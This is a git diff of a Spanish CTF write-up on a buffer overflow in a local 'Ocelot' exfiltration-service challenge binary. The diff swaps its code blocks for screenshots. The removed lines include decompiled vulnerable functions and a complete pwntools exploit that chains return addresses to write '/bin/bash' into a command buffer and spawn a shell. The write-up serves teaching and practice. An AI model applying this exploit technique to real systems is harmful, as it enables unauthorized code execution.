@@ -27,21 +27,8 @@ Al decompilarlo utilizando **Binary Ninja**, obtuvimos el siguiente resultado:
 
 Para comprender mejor lo que está sucediendo, analizaremos cada una de las funciones involucradas. Comencemos por examinar la función **`main()`**.
 
-```c
-08049295    int32_t main(int32_t argc, char** argv, char** envp)
+![image](https://github.com/user-attachments/assets/b02ac19e-6c9c-4cc1-a44e-501dbba6ca1b)
 
-0804929c        void* const __return_addr_1 = __return_addr
-080492a3        int32_t* var_10 = &argc
-080492b2        setup()
-080492b2        
-080492f0        for (int32_t i = 0; strlen("echo Datos exfiltrados") u>= i; i += 1)
-080492de            updateCommand(i, (*"echo Datos exfiltrados")[i])
-080492de        
-0804930b        puts(str: "Servicio de exfiltracion Ocelot …")
-08049313        vuln()
-08049318        execCommand()
-0804932b        return 0
-```
 
 ### Desglose del flujo en **`main`**:
 
@@ -63,13 +50,8 @@ Para comprender mejor lo que está sucediendo, analizaremos cada una de las func
 
 Ahora, analicemos qué está sucediendo en la función **`vuln()`**.
 
-```c
-08049248    char* vuln()
+![image](https://github.com/user-attachments/assets/dc407aa7-fba7-48d0-ace4-4b117493f938)
 
-08049267        puts(str: "Recibiendo datos...")
-08049294        void buf
-08049294        return fgets(&buf, n: 0x200, fp: *stdin)
-```
 
 Algo interesante ocurre aquí: el tamaño de los datos que **`fgets()`** intenta recibir es de **0x200 bytes** (512 en decimal), pero el buffer disponible tiene un tamaño de **268 bytes** (0x10c). Esto genera un **desbordamiento de buffer**. En otras palabras, al intentar almacenar más datos de los que el buffer puede manejar, los datos adicionales sobrescriben áreas adyacentes de memoria, lo que puede alterar el comportamiento del programa y, en muchos casos, permitir la explotación de la vulnerabilidad para ejecutar código arbitrario.
 
@@ -149,41 +131,28 @@ Vamos a desglosar el script **`exploit.py`** línea por línea y explicar cómo 
 
 ### 1. **Inicialización del Proceso**:
 
-```python 
-shell = process("./chal")`
-```
+![image](https://github.com/user-attachments/assets/d1fa8d3d-b402-4a7d-87a3-5834bd11e6fc)
+
 
 **`process("./chal")`**: Inicia el proceso del binario **`chal`** que es el que estamos explotando.
 **`gdb.debug`**: Esta línea está comentada, pero en caso de descomentarla, lanzaría el binario en **gdb** con el control sobre la ejecución. Aquí no la estamos utilizando, pero si quisiéramos hacer una depuración interactiva, esta es la línea que usaríamos.
 ### 2. **Configuración del Offset y Payload Inicial**:
 
-```python
-offset = 268 junk = b"A" * offset
-```
+![image](https://github.com/user-attachments/assets/8465ef41-bd90-418d-b21e-571bbe38a4a6)
+
 
 - **`offset = 268`**: Esto establece la cantidad de bytes necesarios para llegar a la dirección de retorno (basado en el tamaño del buffer y el desbordamiento). Se calcula previamente durante la explotación.    
 - **`junk = b"A" * offset`**: Se genera una secuencia de **268 bytes de 'A'** que servirán para llenar el buffer hasta el punto en que sobrescriba la dirección de retorno.
 
 ### 3. **Comando de la Shell**:
 
-```python
-cmd = b"/bin/bash\x00"
-```
+![image](https://github.com/user-attachments/assets/96988c6f-65d2-420d-91d8-375d71ede1c4)
+
 
 - **`cmd = b"/bin/bash\x00"`**: Este es el comando que queremos ejecutar una vez que obtengamos el control sobre el flujo de ejecución. En este caso, estamos tratando de ejecutar una shell interactiva de Bash.    
 ### 5. **Bucle para Sobrescribir Dirección de Retorno y Enviar Comando**:
 
-```python
-for i in range(len(cmd)):
-    payload = b""
-    payload += junk 
-    payload += p32(0x80491f3) #updateCommand
-    payload += p32(0x8049248) #vuln
-    payload += p32(i)         #iteradordelbucle
-    payload += p32(u8(cmd[i:i+1])) #caracterDelcmd
-
-    shell.sendlineafter(b"...\n", payload)
-```
+![image](https://github.com/user-attachments/assets/db177206-a8aa-4659-ae91-7ea384ab5992)
 
 - **Bucle sobre `cmd`**: Este bucle recorre cada carácter del comando **`/bin/bash`**.
     
@@ -197,9 +166,8 @@ for i in range(len(cmd)):
 
 ### **Interacción con la Shell**:
 
-```python
-shell.interactive()
-```
+![image](https://github.com/user-attachments/assets/c6b50a14-137a-4776-9eb7-f3e4405649f5)
+
 
 - **`shell.interactive()`**: Permite la interacción con la shell que hemos abierto en el paso anterior. Esto hace que el programa pase al modo interactivo, donde el atacante puede ingresar comandos en la shell obtenida.
 
@@ -207,36 +175,6 @@ Si juntamos todo esto obtenemos lo siguiente
 
 ![](../img/c2_server_pwn/9.png)
 
-```python
-#!/usr/bin/python3 
-
-from pwn import *
-
-#shell = gdb.debug("./chal", "continue")
-shell = process("./chal")
-
-offset = 268
-junk = b"A" * offset 
-
-cmd = b"/bin/bash\x00"
-
-for i in range(len(cmd)):
-    payload = b""
-    payload += junk 
-    payload += p32(0x80491f3) #updateCommand
-    payload += p32(0x8049248) #vuln
-    payload += p32(i)         #iteradordelbucle
-    payload += p32(u8(cmd[i:i+1])) #caracterDelcmd
-
-    shell.sendlineafter(b"...\n", payload)
-
-payload = b""
-payload += junk 
-payload += p32(0x804921d) #executeCommand
-shell.sendlineafter(b"...\n", payload)
-
-shell.interactive()
-```
 
 **Nota**: Utilizamos el payload una vez más, junto con la dirección de **`execCommand`**, porque, después de completar el barrido de caracteres uno por uno, necesitamos sobrescribir la memoria una vez más para redirigir la ejecución y llamar a la función **`execCommand`**. Esto nos permitirá finalmente ejecutar el comando **`/bin/bash`** y obtener la shell.
 
@@ -246,5 +184,5 @@ En resumen, nuestro exploit aprovecha el **desbordamiento de buffer** para sobre
 
 Y seria todo por este desafío :)
 
-
+Gracias a xchg2pwn por siempre estar dispuesto a enseñar sobre estos temas, saludos crack!!!
 
